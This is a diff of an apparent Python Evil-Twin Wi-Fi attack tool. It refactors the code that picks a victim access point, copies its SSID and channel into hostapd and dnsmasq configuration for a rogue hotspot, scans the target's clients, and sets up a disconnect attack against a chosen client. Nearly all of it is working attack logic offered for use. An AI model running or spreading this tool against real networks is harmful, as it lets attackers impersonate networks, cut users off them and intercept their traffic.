@@ -47,35 +47,22 @@ def PacketHandlerAP(packet):
 def attackAP(sniff_network_adapter, fakeAP_network_adapter):
     result = input("Choose number of AP to attack: ")
 
-    ssid = extractSSID(str(AP_List[int(result)][1]))
-    print("Selected access point: " + ssid)
-    
-    #For FakeAP configuration files
+    ssid = str(AP_List[int(result)][1])
+    ssid = ssid[2:len(ssid)-1]
     Channel_victim = int(AP_List[int(result)][2])
-    create_conf_file(fakeAP_network_adapter, ssid, Channel_victim)
+
+    print("Selected access point: " + ssid)
+
+    #For FakeAP configuration files
+    fake_ap.Create_hostapd(fakeAP_network_adapter, ssid, Channel_victim)
+    fake_ap.Create_dnsmasq(fakeAP_network_adapter)
 
     # Change your network card to the same channel of AP victim
-    setChannel(Channel_victim, sniff_network_adapter)
+    os.system('iwconfig %s channel %d' % (sniff_network_adapter, Channel_victim))
 
     # Client scanning from chosen AP
     MAC_victim = AP_List[int(result)][0]
     clientScaning(MAC_victim, sniff_network_adapter)
-
-# ------------------------------------------------------------------
-
-def extractSSID(ssid):
-    return ssid[2:len(ssid)-1]
-
-# ------------------------------------------------------------------
-
-def create_conf_file(iface, ssid, channel):
-    fake_ap.Create_hostapd(iface, ssid, channel)
-    fake_ap.Create_dnsmasq(iface)
-
-# ------------------------------------------------------------------
-
-def setChannel(channel, sniff_network_adapter):
-    os.system('iwconfig %s channel %d' % (sniff_network_adapter, channel))
 
 # ------------------------------------------------------------------
 
@@ -107,8 +94,6 @@ def PacketHandlerClients(packet):
 
 
 # -------------Selecting a victim (client) and performing an Evil-Twin attack ---------------
-
-allow = True
 
 # Disconnects the target client from the network
 def attackClient(sniff_network_adapter, fakeAP_network_adapter):
@@ -143,10 +128,9 @@ def DisconnectAttack(choice, sniff_network_adapter):
 # ----------------------------- Setup Fake AP ------------------------------
 
 def setupAP(fakeAP_network_adapter):
-    # allow = False
     print('---> Raising up Fake AP spot\n')
     fake_ap.init_setting()
-    fake_ap.AP_on(fakeAP_network_adapter)
+    fake_ap.start(fakeAP_network_adapter)
 
 # ------------------------------------------------------------------
 
